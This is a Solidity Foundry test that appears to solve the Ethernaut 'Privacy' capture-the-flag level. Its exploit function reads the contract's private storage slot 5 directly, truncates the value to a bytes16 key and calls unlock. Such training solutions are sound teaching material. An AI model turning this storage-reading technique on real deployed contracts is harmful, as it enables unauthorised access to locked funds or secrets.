// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Privacy.sol";
import "src/levels/PrivacyFactory.sol";


contract TestPrivacy is BaseTest {
    Privacy private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PrivacyFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Privacy(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.locked(), true);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);
        /**
        slot variable
        0    bool(locked)
        1    uint256(ID)
        2    uint8(flattening) + uint8(denomination) + uint16(awkwardness)
        3    bytes32[0]
        4    bytes32[1]
        5    bytes32[2]
         */
        bytes32 key = vm.load(address(level), bytes32(uint256(5)));
        emit log_uint(uint256(key));
        bytes16 _key = bytes16(key);
        level.unlock(_key);
        vm.stopPrank();
    }
}
